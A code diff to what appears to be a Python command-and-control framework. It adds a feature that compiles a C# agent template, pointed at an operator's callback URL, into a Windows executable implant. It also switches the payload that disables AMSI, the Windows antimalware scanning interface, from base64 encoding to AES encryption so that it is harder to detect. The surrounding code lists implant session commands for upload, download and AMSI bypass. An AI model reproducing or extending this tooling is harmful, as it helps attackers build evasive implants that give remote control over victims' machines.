@@ -18,7 +18,7 @@ listeners_information = {}
 commands = {}
 aes_encryption_key = base64.b64encode("".join([random.choice(string.uppercase) for i in range(32)]))
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe"]
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "upload", "download", "load", "report", "disable_amsi", "modules"]
 
 def check_url(url):
@@ -118,7 +118,7 @@ def disable_amsi(session):
 	if os.path.isfile(amsi_module):
 		fi = open(amsi_module, "r")
 		module_content = fi.read()
-		base64_command = base64.b64encode(module_content)
+		base64_command = encrypt_command(aes_encryption_key, module_content)
 		commands[session] = base64_command
 		print colored("AMSI disable module has been loaded !", "green")
 
@@ -131,6 +131,25 @@ def generate(hostname, path, proto, interval):
     print "Hack your way in ;)"
     print colored("#====================", "red")
 
+
+def generate_exe(hostname, path, proto, output_path):
+	if os.system("which mono-csc") == 0:
+		url = "{2}://{0}/{1}".format(hostname, path, proto)
+		ft = open("agents/octopus.cs")
+		template = ft.read()
+		code = template.replace("OCT_URL", url)
+		f = open("tmp.cs", "w")
+		f.write(code)
+		f.close()
+		compile_command = "mono-csc /reference:includes/System.Management.Automation.dll tmp.cs /out:%s" % output_path
+		if os.system(compile_command) == 0:
+			print colored("[+] file compiled successfully !", "green")
+			print colored("[+] binary file saved to {0}".format(output_path), "green")
+			os.system("rm tmp.cs")
+		else:
+			print "[-] error while compiling !"
+	else:
+		print "[-] mono-csc is not installed !"
 
 
 def main_help_banner():
